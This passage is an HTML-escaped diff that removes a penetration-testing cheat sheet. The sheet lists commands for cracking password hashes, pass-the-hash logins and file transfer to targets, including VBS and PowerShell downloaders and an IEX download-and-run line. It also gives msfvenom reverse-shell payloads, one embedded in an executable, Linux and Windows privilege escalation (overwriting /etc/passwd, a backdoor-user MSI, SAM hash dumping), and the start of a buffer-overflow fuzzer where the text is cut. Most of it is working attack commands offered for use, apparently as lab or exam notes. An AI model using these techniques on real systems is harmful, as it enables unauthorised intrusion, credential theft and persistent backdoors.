-&lt;p&gt;Windows credential editor: WCE can search for passwords and steal credentials from memory. It is located under the /usr/share/wce/ directory in Kali.&lt;/p&gt;
-
-&lt;p&gt;Brute force pwdump (fgdump output): &lt;code class=&quot;highlighter-rouge&quot;&gt;john --wordlist=/usr/share/wordlists/rockyou.txt [pwdump file]&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Cracking linux hashes (you will need both /etc/passwd and /etc/shadow):&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;unshadow passwd-file.txt shadow-file.txt &amp;gt; unshadowed.txt
-john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Brute force password-protected zip files:
-&lt;code class=&quot;highlighter-rouge&quot;&gt;fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt [zip file]&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Pass-the-hash for SMB:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;export SMBHASH=[Hash]
-pth-winexe -U administrator% //[IP] cmd
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;If you want to login to SMB, you could also do &lt;code class=&quot;highlighter-rouge&quot;&gt;smbmap -u [username] -p [hash] -H [IP]&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h3 id=&quot;file-uploaddownload&quot;&gt;File Upload/Download&lt;/h3&gt;
-&lt;p&gt;&lt;b&gt;Netcat:&lt;/b&gt;&lt;/p&gt;
-
-&lt;p&gt;On the receiving end: &lt;code class=&quot;highlighter-rouge&quot;&gt;nc -l -p 1234 &amp;gt; file&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;On the sending end: &lt;code class=&quot;highlighter-rouge&quot;&gt;nc [destination] 1234 &amp;lt; file&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;b&gt;pyftpdlib:&lt;/b&gt;&lt;/p&gt;
-
-&lt;p&gt;On Kali Linux:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cp folder/to/share
-pip install pyftpdlib
-python -m pyftpdlib -w -p 21
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;On the target: &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp [your IP]&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;On the target, you could also write down the ftp commands you’ll use in a file and then run &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp -s:ftp_commands.txt&lt;/code&gt;. The first line should be &lt;code class=&quot;highlighter-rouge&quot;&gt;open [IP address]&lt;/code&gt;, and the next two lines should be the username and password (if the username is anonymous, you can set the password to be anything, but it must be something).&lt;/p&gt;
-
-&lt;p&gt;&lt;b&gt;smbserver.py&lt;/b&gt;&lt;/p&gt;
-
-&lt;p&gt;On Kali:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/smbserver.py
-smbserver.py a file
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;On the target: &lt;code class=&quot;highlighter-rouge&quot;&gt;\\[your IP]\a\file&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;b&gt;TFTP&lt;/b&gt;&lt;/p&gt;
-
-&lt;p&gt;On Kali:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mkdir tftp/
-atftpd --daemon --port 69 tftp/
-cp [file to send] tftp/
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;On the target: &lt;code class=&quot;highlighter-rouge&quot;&gt;tftp -i [your IP] get [file]&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;b&gt;HTTP&lt;/b&gt;&lt;/p&gt;
-
-&lt;p&gt;Setup a web server on Kali using &lt;code class=&quot;highlighter-rouge&quot;&gt;systemctl enable apache2&lt;/code&gt;. Copy the file that you want to send to /var/www/html/. Then navigate to http://[your IP]/file on the target system’s web browser. If you are unable to access the target system’s web browser, create a script called wget.vbs on the target machine by running the following code:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo strUrl = WScript.Arguments.Item(0) &amp;gt; wget.vbs 
-echo StrFile = WScript.Arguments.Item(1) &amp;gt;&amp;gt; wget.vbs 
-echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &amp;gt;&amp;gt; wget.vbs 
-echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &amp;gt;&amp;gt; wget.vbs 
-echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &amp;gt;&amp;gt; wget.vbs 
-echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &amp;gt;&amp;gt; wget.vbs 
-echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts &amp;gt;&amp;gt; wget.vbs 
-echo Err.Clear &amp;gt;&amp;gt; wget.vbs 
-echo Set http = Nothing &amp;gt;&amp;gt; wget.vbs 
-echo Set http = CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) &amp;gt;&amp;gt; wget.vbs 
-echo If http Is Nothing Then Set http = CreateObject(&quot;WinHttp.WinHttpRequest&quot;) &amp;gt;&amp;gt; wget.vbs 
-echo If http Is Nothing Then Set http = CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;) &amp;gt;&amp;gt; wget.vbs 
-echo If http Is Nothing Then Set http = CreateObject(&quot;Microsoft.XMLHTTP&quot;) &amp;gt;&amp;gt; wget.vbs 
-echo http.Open &quot;GET&quot;, strURL, False &amp;gt;&amp;gt; wget.vbs 
-echo http.Send &amp;gt;&amp;gt; wget.vbs 
-echo varByteArray = http.ResponseBody &amp;gt;&amp;gt; wget.vbs 
-echo Set http = Nothing &amp;gt;&amp;gt; wget.vbs 
-echo Set fs = CreateObject(&quot;Scripting.FileSystemObject&quot;) &amp;gt;&amp;gt; wget.vbs 
-echo Set ts = fs.CreateTextFile(StrFile, True) &amp;gt;&amp;gt; wget.vbs 
-echo strData = &quot;&quot; &amp;gt;&amp;gt; wget.vbs 
-echo strBuffer = &quot;&quot; &amp;gt;&amp;gt; wget.vbs 
-echo For lngCounter = 0 to UBound(varByteArray) &amp;gt;&amp;gt; wget.vbs 
-echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) &amp;gt;&amp;gt; wget.vbs 
-echo Next &amp;gt;&amp;gt; wget.vbs 
-echo ts.Close &amp;gt;&amp;gt; wget.vbs 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Then execute &lt;code class=&quot;highlighter-rouge&quot;&gt;cscript wget.vbs http://[your IP]/file&lt;/code&gt; on the target machine.&lt;/p&gt;
-
-&lt;p&gt;&lt;b&gt;Powershell&lt;/b&gt;&lt;/p&gt;
-
-&lt;p&gt;For targets that have powershell installed, you can create a powershell script to download a file from a webserver. Setup a webserver on Kali Linux using &lt;code class=&quot;highlighter-rouge&quot;&gt;systemctl enable apache2&lt;/code&gt;, and move the file you want to send to /var/www/html. Run this on the target:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo $storageDir = $pwd &amp;gt; wget.ps1 
-echo $webclient = New-Object System.Net.WebClient &amp;gt;&amp;gt;wget.ps1 
-echo $url = &quot;http://10.11.0.5/file&quot; &amp;gt;&amp;gt;wget.ps1 
-echo $file = &quot;new-exploit.exe&quot; &amp;gt;&amp;gt;wget.ps1 
-echo $webclient.DownloadFile($url,$file) &amp;gt;&amp;gt;wget.ps1 
-powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive - NoProfile -File wget.ps1 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;msfvenom&quot;&gt;Msfvenom&lt;/h3&gt;
-&lt;p&gt;Common payloads:&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;windows/shell_reverse_tcp&lt;/li&gt;
-  &lt;li&gt;windows/shell/reverse_tcp (staged)&lt;/li&gt;
-  &lt;li&gt;php/reverse_php&lt;/li&gt;
-  &lt;li&gt;windows/meterpreter/reverse_https (popular for looking just like normal web traffic)&lt;/li&gt;
-  &lt;li&gt;linux/x86/shell_reverse_tcp&lt;/li&gt;
-  &lt;li&gt;linux/x86/shell/reverse_tcp (staged)&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Creating a windows reverse shell: &lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom -p windows/shell_reverse_tcp LHOST=[local IP] LPORT=[listening port] -f c&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Avoiding bad characters: &lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom -p windows/shell_reverse_tcp LHOST=[local IP] LPORT=[listening port] -f c –e x86/shikata_ga_nai -b &quot;\x00\x0a\x0d&quot; &lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Prevent the process from exiting: Use the &lt;code class=&quot;highlighter-rouge&quot;&gt;EXITFUNC=thread&lt;/code&gt; option when using msfvenom.&lt;/p&gt;
-
-&lt;p&gt;Injecting a payload into an existing PE executable: &lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom -p windows/shell_reverse_tcp LHOST=[local IP] LPORT=[listening port] -f exe -e x86/shikata_ga_nai -i 9 -x binary_to_inject_into.exe -o shell_reverse_msf_encoded_embedded.exe&lt;/code&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;upgrading-shell&quot;&gt;Upgrading Shell&lt;/h3&gt;
-
-&lt;p&gt;On a Kali Linux terminal, use &lt;code class=&quot;highlighter-rouge&quot;&gt;stty -a&lt;/code&gt; to see information about your window. On the victim, run &lt;code class=&quot;highlighter-rouge&quot;&gt;python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'&lt;/code&gt; (if the victim does not have Python installed, &lt;a href=&quot;https://netsec.ws/?p=337&quot;&gt;click here&lt;/a&gt; to get a list of other commands that you can run). After running the command to spawn a TTY shell, Ctrl-Z out of the reverse shell you’re currently in, and type in the following three commands:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;stty raw -echo
-fg
-reset
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Note that your terminal may get messed up while doing this and print out random characters, but once you type in “reset”, it should go back to normal. Now all you have to do is type in the following three commands:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;export SHELL=bash
-export TERM=[terminal type]
-stty rows [rows] columns [134]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;You should know how many rows and columns you have because when you typed in &lt;code class=&quot;highlighter-rouge&quot;&gt;stty -a&lt;/code&gt; earlier, it printed out this information. The terminal type can vary depending on what kind of terminal you have, but I used “xterm-256color” as my terminal type.&lt;/p&gt;
-
-&lt;h3 id=&quot;linux-privesc&quot;&gt;Linux Privesc&lt;/h3&gt;
-
-&lt;p&gt;Find the version of linux: &lt;code class=&quot;highlighter-rouge&quot;&gt;uname -a&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Add public key to list of authorized SSH keys: &lt;code class=&quot;highlighter-rouge&quot;&gt;echo $(wget http://[your IP]/.ssh/id_rsa.pub) &amp;gt;&amp;gt; ~/.ssh/authorized_keys &lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;C Code for becoming root (required for some exploits): &lt;code class=&quot;highlighter-rouge&quot;&gt;echo -e '#include &amp;lt;stdio.h&amp;gt;\n#include &amp;lt;sys/types.h&amp;gt;\n#include &amp;lt;unistd.h&amp;gt;\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem(&quot;/bin/bash&quot;);\n}' &amp;gt; setuid.c&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;If /etc/password has incorrect permissions, execute this code to instantly become root: &lt;code class=&quot;highlighter-rouge&quot;&gt;echo 'root::0:0:root:/root:/bin/bash' &amp;gt; /etc/passwd; su&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Changing PATH: If you can change the PATH variable, run &lt;code class=&quot;highlighter-rouge&quot;&gt;export PATH=.$PATH&lt;/code&gt; to add the current folder to the PATH variable. Create a poisoned executable by typing in &lt;code class=&quot;highlighter-rouge&quot;&gt;echo &quot;usermod -aG sudo [username]&quot; &amp;gt;&amp;gt; /tmp/yo&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;chmod +x yo&lt;/code&gt;. Replace yo with the name of a binary that is executed by root by another command or process. If you’re still confused, have a look at &lt;a href=&quot;http://techblog.rosedu.org/exploiting-environment-variables.html&quot;&gt;this&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;Add to sudoers: Run &lt;code class=&quot;highlighter-rouge&quot;&gt;usermod -aG sudo [username]&lt;/code&gt;. You could also try seeing if you have permission to edit the /etc/sudoers file using &lt;code class=&quot;highlighter-rouge&quot;&gt;visudo&lt;/code&gt;. Sometimes, if you’re lucky, you can instantly get root by doing &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo su&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Print commands that we are allowed to run as sudo: &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;If you see a command in this list that allows you execute code, then you can execute code as root. For example, if we are allowed to use the find command as sudo, you can use &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo find /home -exec sh -i\;&lt;/code&gt;. Another example: if we are allowed to use the python command as sudo, you can use &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo python -c &quot;import pty; pty.spawn('/bin/bash');&quot;&lt;/code&gt;. You can use &lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;GTFOBins&lt;/a&gt; to get a list of things that you can do when you are able to execute something as root.&lt;/p&gt;
-
-&lt;p&gt;Exploit cron jobs: You can find cron jobs using &lt;code class=&quot;highlighter-rouge&quot;&gt;ls -la /etc/cron.d&lt;/code&gt;. If you can write to any of the files controlling the cron job, you can write your own command at the end of a cron job and have it be executed as root. For example, if you see a cron job called “update”, you can search for the sh file that is running that cron job using &lt;code class=&quot;highlighter-rouge&quot;&gt;find / -perm 2 -type f 2&amp;gt;/dev/null | grep update&lt;/code&gt;, and then you can modify it.&lt;/p&gt;
-
-&lt;p&gt;Print out binaries that have the SUID bit set: &lt;code class=&quot;highlighter-rouge&quot;&gt;find / -perm -u=s type f 2&amp;gt;/dev/null&lt;/code&gt;. Sometimes &lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;GTFOBins&lt;/a&gt; can help you escalate privileges if you see an SUID binary.&lt;/p&gt;
-
-&lt;p&gt;Script to extract passwords from known locations: &lt;a href=&quot;https://github.com/0xmitsurugi/gimmecredz&quot;&gt;gimmecredz&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Enumeration scripts:&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py&quot;&gt;linuxprivchecker.py&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh&quot;&gt;LinEnum.sh&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/mzet-/linux-exploit-suggester&quot;&gt;linux-exploit-suggester&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Good checklists:&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://guif.re/linuxeop&quot;&gt;Guif.re&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&quot;&gt;g0tmi1k&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://payatu.com/guide-linux-privilege-escalation&quot;&gt;payatu&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;windows-privesc&quot;&gt;Windows Privesc&lt;/h3&gt;
-
-&lt;p&gt;Get system info: &lt;code class=&quot;highlighter-rouge&quot;&gt;systeminfo&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;List environment variables: &lt;code class=&quot;highlighter-rouge&quot;&gt;set&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;List your privileges: &lt;code class=&quot;highlighter-rouge&quot;&gt;whoami /priv&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Overwriting an Executable with Insecure Permissions:
-Create a program called useradd.c on either the target (preferable, but if they don’t have gcc, you can’t do this) or on Kali.&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt; 
-
-int main () { 
-    int i; 
-    i=system (&quot;net localgroup administrators low /add&quot;); 
-    return 0; 
-} 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Replace low with the name of your current user. Compile useradd.c using &lt;code class=&quot;highlighter-rouge&quot;&gt;i686-w64-mingw32-gcc -o tooverwrite.exe useradd.c&lt;/code&gt;, and move the exexcutable to the same directory as the executable that you want to overwrite.&lt;/p&gt;
-
-&lt;p&gt;List scheduled tasks: &lt;code class=&quot;highlighter-rouge&quot;&gt;schtasks /query /fo LIST /v&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;List running services: &lt;code class=&quot;highlighter-rouge&quot;&gt;tasklist /SVC&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;List started services: &lt;code class=&quot;highlighter-rouge&quot;&gt;net start&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;See what software is installed:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dir /a &quot;C:\Program Files&quot; 
-dir /a &quot;C:\Program Files (x86)&quot; 
-reg query HKEY_LOCAL_MACHINE\SOFTWARE 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Dumping windows password hashes: You can use fgdump.exe to dump passwords in a file ending with .pwdump. Fgdump will also attempt to kill local antiviruses before dumping the passwords.&lt;/p&gt;
-
-&lt;p&gt;Adding users: &lt;code class=&quot;highlighter-rouge&quot;&gt;net user [username] [password] /ADD&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Changing group: &lt;code class=&quot;highlighter-rouge&quot;&gt;net localgroup [group name] [username] /ADD&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;AlwaysElevated: Check if these two registry values are set to 1 by using &lt;code class=&quot;highlighter-rouge&quot;&gt;reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated&lt;/code&gt;. If they are, then use the following command to create a malicious MSI: &lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi&lt;/code&gt;. Send the MSI to the target, and run the MSI file using &lt;code class=&quot;highlighter-rouge&quot;&gt;msiexec /quiet /qn /i evil.msi&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Looking at the registry: If you can’t use the reg command, use the regedit command instead.&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;regedit /E file.reg &quot;REGISTRY/VALUE/TO/READ&quot;
-type file.reg
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Getting admin hashes: Look in the below locations for password hashes&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;%SYSTEMROOT%\repair\SAM&lt;/li&gt;
-  &lt;li&gt;%SYSTEMROOT%\System32\config\RegBack\SAM&lt;/li&gt;
-  &lt;li&gt;%SYSTEMROOT%\System32\config\SAM&lt;/li&gt;
-  &lt;li&gt;%SYSTEMROOT%\repair\system&lt;/li&gt;
-  &lt;li&gt;%SYSTEMROOT%\System32\config\SYSTEM&lt;/li&gt;
-  &lt;li&gt;%SYSTEMROOT%\System32\config\RegBack\system&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Download both the SAM file and the SYSTEM file onto Kali Linux, and then run &lt;code class=&quot;highlighter-rouge&quot;&gt;impacket-secretdump -sam SAM -system SYSTEM local&lt;/code&gt; to get the hashes.&lt;/p&gt;
-
-&lt;p&gt;Searching for exploits: Run &lt;a href=&quot;https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py&quot;&gt;this script&lt;/a&gt; on Kali.&lt;/p&gt;
-
-&lt;p&gt;Checklists:&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;http://www.fuzzysecurity.com/tutorials/16.html&quot;&gt;fuzzysecurity&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/&quot;&gt;absolomb&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Jaws Windows Enumerate Script (Requires Powershell): The script is found &lt;a href=&quot;https://github.com/411Hall/Jaws&quot;&gt;here&lt;/a&gt;. You can easily download and run the script using the following commands (assuming that you have a webserver setup on Kali and you have put the jaws-enum.ps1 file under /var/www/html).&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;powershell 
-IEX(New-Object Net.WebClient).downloadString('http://[your IP]/jaws-enum.ps1') 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;metasploit&quot;&gt;Metasploit&lt;/h3&gt;
-
-&lt;p&gt;Selecting a module:
-&lt;code class=&quot;highlighter-rouge&quot;&gt;use [module]&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Setting a payload:
-&lt;code class=&quot;highlighter-rouge&quot;&gt;use [payload]&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Common payloads:&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;windows/shell_reverse_tcp&lt;/li&gt;
-  &lt;li&gt;windows/shell/reverse_tcp (staged)&lt;/li&gt;
-  &lt;li&gt;php/reverse_php&lt;/li&gt;
-  &lt;li&gt;windows/meterpreter/reverse_https (popular for looking just like normal web traffic)&lt;/li&gt;
-  &lt;li&gt;linux/x86/shell_reverse_tcp&lt;/li&gt;
-  &lt;li&gt;linux/x86/shell/reverse_tcp (staged)&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Handle incoming connections:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;use exploit/multi/handler
-set LHOST [local IP]
-set LPORT [port]
-exploit
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Common meterpreter commands:&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;Upload files: &lt;code class=&quot;highlighter-rouge&quot;&gt;upload [local file] [remote location for file]&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;Download files: &lt;code class=&quot;highlighter-rouge&quot;&gt;download [remote file] [local location for file]&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;Open a shell: &lt;code class=&quot;highlighter-rouge&quot;&gt;shell&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;Find basic information about the target: &lt;code class=&quot;highlighter-rouge&quot;&gt;sysinfo&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;Get the current user: &lt;code class=&quot;highlighter-rouge&quot;&gt;getuid&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;Search for a file: &lt;code class=&quot;highlighter-rouge&quot;&gt;search –f *pass*.txt&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;Take a screenshot of the desktop: &lt;code class=&quot;highlighter-rouge&quot;&gt;screenshot&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Convert metasploit modules to stand alone (a little bit advanced): &lt;a href=&quot;https://netsec.ws/?p=262&quot;&gt;https://netsec.ws/?p=262&lt;/a&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;steps-for-buffer-overflow&quot;&gt;Steps for Buffer Overflow&lt;/h3&gt;
-&lt;p&gt;1.) Gradually fuzz the input until you see that the program has crashed. Here is an example program that can be used for fuzzing:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python 
-&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt; 
-&lt;span class=&quot;c1&quot;&gt;# Create an array of buffers, from 1 to 5900, with increments of 200. 
-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; 
-&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt; 
-&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; 
-    &lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
-    &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt; 
-&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; 
